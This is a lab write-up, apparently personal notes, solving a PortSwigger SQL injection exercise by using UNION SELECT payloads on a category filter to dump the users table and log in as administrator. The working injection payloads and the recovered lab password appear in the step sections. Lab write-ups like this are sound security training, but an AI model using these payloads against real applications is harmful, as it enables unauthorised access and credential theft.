
# #PortSwigger 


![[Pasted image 20251212224300.png]]


## Lab Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The database contains a table called `users`, with columns `username` and `password`.

**Objective:** Perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

---
---

### Step 1: Capture the Category Filter Request

1. In Burp's browser, access the lab
2. Click on a product category filter (e.g., "Gifts")
3. In Burp Proxy, find the request

**Example request:**
```
GET /filter?category=Gifts HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```


---

### Step 2: Determine Number of Columns

**Test with `UNION SELECT 'abc','def'`:**
```
'+UNION+SELECT+'abc','def'--
```

**Response:**
![[Pasted image 20251212224331.png]]
2 columns, both contain text data.

---

### Step 3: Retrieve Usernames and Passwords

**Payload:**
```
GET /filter?category=' UNION SELECT username, password FROM users-- HTTP/1.1
```

**Response:**
![[Pasted image 20251212224418.png]]


---

### Step 4: Log In as Administrator

1. Go to the login page
2. Username: `administrator`
3. Password: `6588yiniio5m3qwnwx1`
4. Click **Log in**


![[Pasted image 20251212224502.png]]


---

### Step 5: Lab Solved

![[Pasted image 20251212224522.png]]


---
---

